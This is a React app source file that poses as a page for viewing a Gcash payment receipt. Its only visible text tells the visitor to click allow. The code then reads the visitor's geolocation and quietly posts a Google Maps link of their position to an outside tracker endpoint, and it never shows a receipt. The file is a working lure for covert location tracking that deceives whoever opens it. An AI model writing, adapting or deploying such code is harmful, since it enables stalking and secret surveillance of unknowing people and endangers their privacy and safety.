import { useState, useEffect } from 'react';
import './App.css';

function App() {
  const [location, setLocation] = useState(null);
  const [error, setError] = useState(null);

  useEffect(() => {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          setLocation({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
          });
        },
        (err) => {
          setError("Error getting location: " + err.message);
        }
      );
    } else {
      setError("Geolocation is not supported by your browser");
    }
  }, []);

  // Only try to print location when it's available
  useEffect(() => {
    if (location) {
      const googleMapsLink = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
      console.log(`Link: ${googleMapsLink}`);
      
      fetch('https://maptrackerapi.onrender.com/api/locations', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          googleMapsLink: googleMapsLink
        })
      })
      .then(response => response.json())
      .then(data => console.log('Success:', data))
      .catch(error => console.error('Error:', error));
    }
  }, [location]);

  useEffect(() => {
    if (error) {
      console.error(error);
    }
  }, [error]);

  return (
    <div className="App">
      <header className="App-header">
        <h1>Click allow to view the Gcash receipt</h1>
      </header>
    </div>
  );
}

export default App;
